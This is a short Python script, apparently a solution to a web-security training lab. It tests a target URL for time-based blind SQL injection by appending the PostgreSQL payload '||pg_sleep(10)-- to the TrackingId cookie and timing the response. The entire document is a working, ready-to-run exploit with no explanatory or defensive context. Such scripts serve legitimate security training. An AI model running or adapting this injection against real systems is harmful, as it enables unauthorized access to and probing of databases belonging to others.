```python
import requests
import sys
import time

if len(sys.argv) != 2:
    print(f"[+] USAGE : {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

url = sys.argv[1]

response = requests.get(url)
payload = response.cookies["TrackingId"] + "'||pg_sleep(10)--"
sess_cookie = response.cookies["session"]

start = time.time()
response = requests.get(url, headers={"Cookie":"TrackingId="+payload+"; session="+sess_cookie})
end = time.time()

delay = end - start
if delay >= 10:
    print("[+] Successful!!!")
else:
    print("[-] Try Harder...")
```